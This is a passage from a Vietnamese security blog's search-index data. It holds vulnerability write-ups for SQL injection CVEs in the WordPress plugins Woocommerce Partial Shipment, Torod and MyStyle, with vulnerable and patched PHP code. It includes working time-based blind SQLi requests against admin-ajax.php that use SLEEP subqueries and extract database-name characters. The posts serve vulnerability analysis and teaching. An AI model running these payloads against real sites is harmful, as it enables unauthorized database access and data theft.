wc-partial-shipment/woocommerce-partial-shipment.php ƒë·ªÉ t√¨m sink. {: .prompt-tip }\nget_shipment_id v√† get_wxp_shipment_data l√† 2 h√†m thu·ªôc class WXP_Partial_Shipment ƒë√°ng ch√∫ √Ω, d·ªØ li·ªáu ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o c√¢u query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t n√†o. Do ƒë√≥, l·ªó h·ªïng SQLi c√≥ th·ªÉ x·∫£y ra.\nB·∫£n v√° s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() ƒë·ªÉ chu·∫©n b·ªã c√¢u query, thay v√¨ n·ªëi tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng. ƒêi·ªÅu n√†y ƒë·∫£m b·∫£o r·∫±ng t·∫•t c·∫£ gi√° tr·ªã ƒë∆∞·ª£c escape ƒë√∫ng c√°ch tr∆∞·ªõc khi ch√®n v√†o SQL, ngƒÉn ng·ª´a nguy c∆° SQL Injection.\nHow it work? get_shipment_id v√† get_wxp_shipment_data ƒë·ªÅu ƒë∆∞·ª£c h√†m wxp_order_set_shipped trong c√πng class g·ªçi v√† s·ª≠ d·ª•ng.\nfunction wxp_order_set_shipped(){ $order_id = isset($_POST[\u0026#39;order_id\u0026#39;]) ? $_POST[\u0026#39;order_id\u0026#39;] : 0; // other logic $wxp_shipment = $this-\u0026gt;get_wxp_shipment_data($order_id); if(isset($_POST[\u0026#39;order_id\u0026#39;]) \u0026amp;\u0026amp; $_POST[\u0026#39;order_id\u0026#39;]){ global $wpdb; $shipment_id = $this-\u0026gt;get_shipment_id($_POST[\u0026#39;order_id\u0026#39;]); if(!$shipment_id){ $data = array( \u0026#39;order_id\u0026#39; =\u0026gt;$order_id, \u0026#39;shipment_id\u0026#39; =\u0026gt;1, \u0026#39;shipment_url\u0026#39;=\u0026gt;\u0026#39;\u0026#39;, \u0026#39;shipment_num\u0026#39;=\u0026gt;\u0026#39;\u0026#39;, \u0026#39;shipment_date\u0026#39;=\u0026gt;current_time(\u0026#39;timestamp\u0026#39;,0), ); $wpdb-\u0026gt;insert($wpdb-\u0026gt;prefix.\u0026#34;partial_shipment\u0026#34;,$data,array(\u0026#39;%d\u0026#39;,\u0026#39;%d\u0026#39;,\u0026#39;%s\u0026#39;,\u0026#39;%s\u0026#39;,\u0026#39;%s\u0026#39;)); $shipment_id = $wpdb-\u0026gt;insert_id; } // other logic } echo json_encode(array(\u0026#39;order_id\u0026#39;=\u0026gt;$order_id,\u0026#39;status\u0026#39;=\u0026gt;$status_key)); exit(); } üëâ order_id ƒë∆∞·ª£c l·∫•y t·ª´ POST request, n∆°i ng∆∞·ªùi d√πng c√≥ th·ªÉ ki·ªÉm so√°t l√†m ƒë·ªëi s·ªë khi g·ªçi h√†m get_shipment_id v√† get_wxp_shipment_data truy·ªÅn v√†o c√¢u query ch·ª©a l·ªï h·ªóng SQLi.\nƒê·ªÉ x√°c ƒë·ªãnh n∆°i wxp_order_set_shipped ƒë∆∞·ª£c g·ªçi v√† s·ª≠ d·ª•ng, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a wxp_order_set_shipped trong th∆∞ m·ª•c ch·ª©a plugin.\nwxp_order_set_shipped ƒë∆∞·ª£c construct c·ªßa c√πng class s·ª≠ d·ª•ng l√†m callback cho hook wp_ajax_wxp_order_set_shipped =\u0026gt; y√™u c·∫ßu ng∆∞·ªùi d√πng ph·∫£i ƒëƒÉng nh·∫≠p\nüëâ Khi truy c·∫≠p v√†o /wp-admin/admin-ajax.php v·ªõi tham s·ªë:\naction=wxp_order_set_shipped\u0026amp;order_id=payload_here Callback wxp_order_set_shipped ƒë∆∞·ª£c g·ªçi order_id ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ request v√† ch√®n v√†o SQL query. Query th·ª±c thi 2 l·∫ßn do ƒë∆∞·ª£c truy·ªÅn v√†o 2 h√†m ch·∫°y l·ªánh SQL v·ªõi payload ƒë·ªôc h·∫°i. Exploit Detect SQLi G·ª≠i POST request ch·ª©a payload SQLi.\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=wxp_order_set_shipped\u0026amp;order_id=(SELECT 1 FROM (SELECT SLEEP(5))a) Khi ƒë√≥ c√¢u query s·∫Ω tr·ªü th√†nh:\nSELECT id as ship_id FROM wp_partial_shipment WHERE order_id=(SELECT 1 FROM (SELECT SLEEP(5))a) ·ªû ƒë√¢y c√≥ 2 n∆°i th·ª±c hi·ªán query n√™n th·ªùi gian ph·∫£n h·ªìi s·∫Ω tƒÉng g·∫•p ƒë√¥i\nTa s·ª≠ d·ª•ng subquery trong m·ªánh ƒë·ªÅ FROM v√¨ truy v·∫•n con ƒë∆∞·ª£c coi nh∆∞ m·ªôt b·∫£ng t·∫°m th·ªùi. MySQL s·∫Ω th·ª±c thi truy v·∫•n con tr∆∞·ªõc ƒë·ªÉ t·∫°o b·∫£ng t·∫°m, sau ƒë√≥ m·ªõi th·ª±c hi·ªán truy v·∫•n ch√≠nh. Khi so s√°nh theo t·ª´ng row, SLEEP ch·ªâ ch·∫°y m·ªôt l·∫ßn trong qu√° tr√¨nh kh·ªüi t·∫°o b·∫£ng t·∫°m, c√°c l·∫ßn so s√°nh ti·∫øp theo s·∫Ω kh√¥ng th·ª±c thi l·∫°i, nh·ªù ƒë√≥ tr√°nh vi·ªác SLEEP b·ªã nh√¢n nhi·ªÅu l·∫ßn.\nV√≠ d·ª• khi g·ª≠i request v·ªõi payload n√†y:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=wxp_order_set_shipped\u0026amp;order_id=(SELECT SLEEP(5)) Th·ªùi gian tr·∫£ v·ªÅ tƒÉng theo c·∫•p s·ªë nh√¢n\nGet First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=wxp_order_set_shipped\u0026amp;order_id=(SELECT 1 FROM (SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1))a) S·ª≠ d·ª•ng SUBSTRING() ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name, IF() tr·∫£ v·ªÅ SLEEP(5) n·∫øu k√Ω t·ª± ƒë√≥ l√† 0x77(\u0026lsquo;w\u0026rsquo;)\nS·ª≠ d·ª•ng hex encoding w th√†nh 0x77 v√¨ order_id ƒë∆∞·ª£c l·∫•y t·ª´ POST request trong n√™n b·ªã escape b·ªüi magic quotes trong WordPress v√† b·ªüi sanitize_text_field.\nüëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† w.\nD·ª±a tr√™n kƒ© thu·∫≠t Timebased SQLi ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript here\nConclusion L·ªó h·ªïng CVE-2025-48118 trong plugin WordPress Woocommerce Partial Shipment tr∆∞·ªõc phi√™n b·∫£n 3.3, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nCh∆∞a c√≥ b·∫£n v√° ch√≠nh th·ª±c n√†o cho l·ªó h·ªïng n√†y.\nKey takeaways:\nKi·ªÉm so√°t k·ªπ input t·ª´ ng∆∞·ªùi d√πng. Lu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Woocommerce Partial Shipment Plugin \u0026lt;= 3.2 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-10-cve-2025-48118/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eWoocommerce Partial Shipment\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e3.3\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-48118\"\u003eCVE-2025-48118\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/wc-partial-shipment/advanced/\"\u003eWordPress Woocommerce Partial Shipment Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 3.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e:  High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eWoocommerce Partial Shipment\u003c/strong\u003e:  v3.2(vul) v√† v3.3(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eActived WooCommerce plugin\u003c/strong\u003e: plugin b·∫Øt bu·ªôc \u003cstrong\u003eactived\u003c/strong\u003e tr∆∞·ªõc khi c√†i \u003cstrong\u003eWoocommerce Partial Shipment Plugin\u003c/strong\u003e, m·ªôt s·ªë h√†m trong \u003cstrong\u003eWooCommerce\u003c/strong\u003e s·∫Ω ƒë∆∞·ª£c s·ª≠ d·ª•ng.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003ePOST\u003c/strong\u003e request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-48118"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Torod c·ªßa WordPress. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-30936 Product: WordPress Torod Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.9 Fixed in: \u0026lt;= N/A CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Torod: v1.9 Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ POST request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø qu·∫£n ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\nVulnerable Sink CVE n√†y kh√¥ng c√≥ b·∫£n v√° n√™n kh√¥ng th·ªÉ s·ª≠ d·ª•ng diff tool ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa code l·ªói v√† code ƒë√£ fix l·ªói.\nTrong WordPress, ƒë·ªÉ SQLi x·∫£y ra, ·ª©ng d·ª•ng ph·∫£i t∆∞∆°ng t√°c v·ªõi database th√¥ng qua bi·∫øn global $wpdb, ta search t·ª´ kh√≥a n√†y trong th∆∞ m·ª•c c·ªßa plugin ƒë·ªÉ t√¨m sink. {: .prompt-tip }\nüëâ D·ªØ li·ªáu t·ª´ $_POST['country_id'] ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o truy v·∫•n SQL m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t h·ª£p l·ªá. Vi·ªác ch·ªâ s·ª≠ d·ª•ng sanitize_text_field() m·ªõi d·ª´ng l·∫°i ·ªü m·ª©c escape chu·ªói, ch·ª© kh√¥ng ƒë·∫£m b·∫£o t√≠nh an to√†n. Do ƒë√≥, l·ªó h·ªïng SQLi c√≥ th·ªÉ x·∫£y ra.\nSource: $_POST['country_id'] Sink: $wpdb-\u0026gt;get_results(\u0026quot;SELECT * FROM $table_name WHERE country_id = $country_id\u0026quot;) How it work? L·ªó h·ªïng n·∫±m trong h√†m get_regions_and_cities c·ªßa class ajaxyk thu·ªôc file inc/ajaxyk.php. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i n√≥ ƒë∆∞·ª£c g·ªçi, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a get_regions_and_cities trong th∆∞ m·ª•c ch·ª©a plugin.\nüëâ get_regions_and_cities ƒë∆∞·ª£c construct c·ªßa class ajaxyk g·ªçi l√†m callback c·ªßa 2 action hook th√¥ng qua h√†m add_action\nwp_ajax_get_regions_and_cities\nƒê∆∞·ª£c vi·∫øt theo c√∫ ph√°p wp_ajax_{$action} Y√™u c·∫ßu ng∆∞·ªùi d√πng ƒëƒÉng nh·∫≠p wp_ajax_nopriv_get_regions_and_cities\nƒê∆∞·ª£c vi·∫øt theo c√∫ ph√°p wp_ajax_nopriv_{$action} Kh√¥ng y√™u c·∫ßu ng∆∞·ªùi d√πng ƒëƒÉng nh·∫≠p V√¨ ƒë√¢y l√† l·ªó h·ªïng unauthenticated n√™n ta ch·ªâ quan t√¢m t·ªõi hook wp_ajax_nopriv_get_regions_and_cities.\nNh∆∞ v·∫≠y khi g·ª≠i POST request ƒë·∫øn /wp-admin/admin-ajax.php v·ªõi tham s·ªë\naction=wp_ajax_nopriv_get_regions_and_cities\u0026amp;country_id=payload_here: Callback get_regions_and_cities ƒë∆∞·ª£c g·ªçi. country_id ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ request v√† ch√®n v√†o SQL query. Query th·ª±c thi v·ªõi payload ƒë·ªôc h·∫°i. Exploit Detect SQLi G·ª≠i POST request ch·ª©a payload SQLi.\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=get_regions_and_cities\u0026amp;country_id=(SELECT 1 FROM (SELECT SLEEP(5))a) Khi ƒë√≥ c√¢u query s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_torod_regions WHERE country_id = (SELECT 1 FROM (SELECT SLEEP(5))a) üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; payload ho·∫°t ƒë·ªông.\nC√°c technique c√≥ th·ªÉ s·ª≠ d·ª•ng trong tr∆∞·ªùng h·ª£p table r·ªóng:\nUNION: v√¨ n√≥ kh√¥ng ph·ª• thu·ªôc v√†o d·ªØ li·ªáu b·∫£ng c·ªßa c√¢u query tr∆∞·ªõc ƒë√≥, nh∆∞ng c·∫ßn ph·∫£i t√¨m ƒë∆∞·ª£c s·ªë c·ªôt t∆∞∆°ng ·ª©ng. Subquery: Subquery trong m·ªánh ƒë·ªÅ WHERE: MySQL c√≥ th·ªÉ t·ªëi ∆∞u h√≥a v√† b·ªè qua subquery n·∫øu k·∫øt qu·∫£ c√≥ th·ªÉ x√°c ƒë·ªãnh s·ªõm. N·∫øu b·∫£ng kh√¥ng c√≥ d·ªØ li·ªáu, k·∫øt qu·∫£ cu·ªëi c√πng s·∫Ω l√† t·∫≠p r·ªóng, MySQL kh√¥ng c·∫ßn th·ª±c thi SLEEP(). Subquery trong m·ªánh ƒë·ªÅ FROM: Truy v·∫•n con ƒë∆∞·ª£c coi l√† b·∫£ng t·∫°m th·ªùi. MySQL ph·∫£i th·ª±c thi truy v·∫•n con n√†y ƒë·∫ßu ti√™n ƒë·ªÉ t·∫°o b·∫£ng t·∫°m th·ªùi, sau ƒë√≥ m·ªõi th·ª±c thi truy v·∫•n ch√≠nh. Get First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=get_regions_and_cities=1\u0026amp;country_id=(SELECT 1 FROM (SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1))a) S·ª≠ d·ª•ng SUBSTRING() ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name, IF() tr·∫£ v·ªÅ SLEEP(5) n·∫øu k√Ω t·ª± ƒë√≥ l√† 0x77(\u0026lsquo;w\u0026rsquo;)\nS·ª≠ d·ª•ng hex encoding w th√†nh 0x77 v√¨ country_id ƒë∆∞·ª£c l·∫•y t·ª´ POST request trong n√™n b·ªã escape b·ªüi magic quotes trong WordPress v√† b·ªüi sanitize_text_field.\nüëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† w.\nD·ª±a tr√™n kƒ© thu·∫≠t Timebased SQLi ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript here\nConclusion L·ªó h·ªïng CVE-2025-30936 trong plugin WordPress Torod t·ª´ phi√™n b·∫£n 1.9 tr·ªü l·∫°i, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nCh∆∞a c√≥ b·∫£n v√° ch√≠nh th·ª±c n√†o cho l·ªó h·ªïng n√†y.\nKey takeaways:\nKi·ªÉm so√°t k·ªπ input t·ª´ ng∆∞·ªùi d√πng. Lu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Torod Plugin \u0026lt;= 1.9 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-10-cve-2025-30936/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eTorod\u003c/strong\u003e c·ªßa WordPress. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-30936\"\u003eCVE-2025-30936\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/torod/\"\u003eWordPress Torod Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.9\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eFixed in\u003c/strong\u003e: \u0026lt;= N/A\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e:  High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTorod\u003c/strong\u003e: v1.9\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003ePOST\u003c/strong\u003e request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø qu·∫£n ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-30936"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin MyStyle Custom Product Designer c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 3.21.2. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-48281 Product: WordPress MyStyle Custom Product Designer Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 3.21.1 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging MyStyle Custom Product Designer: v3.21.1(vul) v√† v3.21.2(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Actived WooCommerce plugin: plugin b·∫Øt bu·ªôc actived tr∆∞·ªõc khi c√†i MyStyle Custom Product Designer Plugin, m·ªôt s·ªë h√†m trong WooCommerce s·∫Ω ƒë∆∞·ª£c s·ª≠ d·ª•ng. Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ GET request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/entities/class-mystyle-designmanager.php\npublic static function get_designs( $per_page = 250, $page_number = 1, WP_User $user = null ) { global $wpdb; // Add security WHERE clause. $where = self::get_security_where_clause( \u0026#39;WHERE\u0026#39;, $user ); if ( ! empty( $_GET[\u0026#39;orderby\u0026#39;] ) ) { $order = \u0026#39; ORDER BY \u0026#39; . sanitize_text_field( wp_unslash( $_GET[\u0026#39;orderby\u0026#39;] ) ); $order .= ! empty( $_GET[\u0026#39;order\u0026#39;] ) ? \u0026#39; \u0026#39; . sanitize_text_field( wp_unslash( $_GET[\u0026#39;order\u0026#39;] ) ) : \u0026#39; ASC\u0026#39;; } else { $order = \u0026#39; ORDER BY ms_design_id DESC\u0026#39;; } $results = $wpdb-\u0026gt;get_results( $wpdb-\u0026gt;prepare( \u0026#39;SELECT * \u0026#39; . \u0026#34;FROM {$wpdb-\u0026gt;prefix}mystyle_designs \u0026#34; . $where . $order . \u0026#39; LIMIT %d OFFSET %d\u0026#39;, array( $per_page, ( $page_number - 1 ) * $per_page, ) ), \u0026#39;OBJECT\u0026#39; ); // other logic } {: file=\u0026ldquo;includes/entities/class-mystyle-designmanager.php v3.21.1\u0026rdquo; }\nD·ªØ li·ªáu t·ª´ $_GET['orderby'] ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o truy v·∫•n SQL m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t h·ª£p l·ªá. Vi·ªác ch·ªâ s·ª≠ d·ª•ng sanitize_text_field() v√† wp_unslash() m·ªõi d·ª´ng l·∫°i ·ªü m·ª©c lo·∫°i b·ªè k√Ω t·ª± ho·∫∑c escape chu·ªói, ch·ª© kh√¥ng ƒë·∫£m b·∫£o t√≠nh an to√†n. Do ƒë√≥, l·ªó h·ªïng SQLi c√≥ th·ªÉ x·∫£y ra.\npublic static function get_designs( $per_page = 250, $page_number = 1, WP_User $user = null ) { global $wpdb; // Add security WHERE clause. $where = self::get_security_where_clause( \u0026#39;WHERE\u0026#39;, $user ); if ( ! empty( $_GET[\u0026#39;orderby\u0026#39;] ) ) { $orderby = sanitize_text_field( wp_unslash( $_GET[\u0026#39;orderby\u0026#39;] ) ); $order = ! empty( $_GET[\u0026#39;order\u0026#39;] ) ? sanitize_text_field( wp_unslash( $_GET[\u0026#39;order\u0026#39;] ) ) : \u0026#39;ASC\u0026#39;; // Validate order direction to prevent SQL injection. $allowed_orderby = array( \u0026#39;ms_design_id\u0026#39;, \u0026#39;ms_title\u0026#39;, \u0026#39;ms_access\u0026#39;, \u0026#39;ms_email\u0026#39;, \u0026#39;ms_date_created\u0026#39;, \u0026#39;ms_date_modified\u0026#39;, ); $orderby = in_array( strtolower( $orderby ), $allowed_orderby, true ) ? $orderby : \u0026#39;ms_design_id\u0026#39;; $order = in_array( strtoupper( $order ), array( \u0026#39;ASC\u0026#39;, \u0026#39;DESC\u0026#39; ), true ) ? $order : \u0026#39;ASC\u0026#39;; $order = \u0026#39; ORDER BY \u0026#39; . $orderby . \u0026#39; \u0026#39; . $order; } else { $order = \u0026#39; ORDER BY ms_design_id DESC\u0026#39;; } $results = $wpdb-\u0026gt;get_results( $wpdb-\u0026gt;prepare( \u0026#39;SELECT * \u0026#39; . \u0026#34;FROM {$wpdb-\u0026gt;prefix}mystyle_designs \u0026#34; . $where . $order . \u0026#39; LIMIT %d OFFSET %d\u0026#39;, array( $per_page, ( $page_number - 1 ) * $per_page, ) ), \u0026#39;OBJECT\u0026#39; ); // other logic } {: file=\u0026ldquo;includes/entities/class-mystyle-designmanager.php v3.21.2\u0026rdquo; }\nB·∫£n v√° s·ª≠ d·ª•ng while list $allowed_orderby ƒë·ªÉ quy ƒë·ªãnh r√µ c√°c c·ªôt ƒë∆∞·ª£c ph√©p s·∫Øp x·∫øp. N·∫øu gi√° tr·ªã orderby kh√¥ng n·∫±m trong danh s√°ch h·ª£p l·ªá th√¨ s·∫Ω b·ªã thay th·∫ø b·∫±ng m·∫∑c ƒë·ªãnh 'ms_design_id' =\u0026gt; ch·∫∑n kh·∫£ nƒÉng ch√®n payload ƒë·ªôc l·∫°i.\nHow it work? L·ªó h·ªïng n·∫±m trong h√†m get_designs c·ªßa class MyStyle_DesignManager thu·ªôc file includes/entities/class-mystyle-designmanager.php. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i n√≥ ƒë∆∞·ª£c g·ªçi, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a 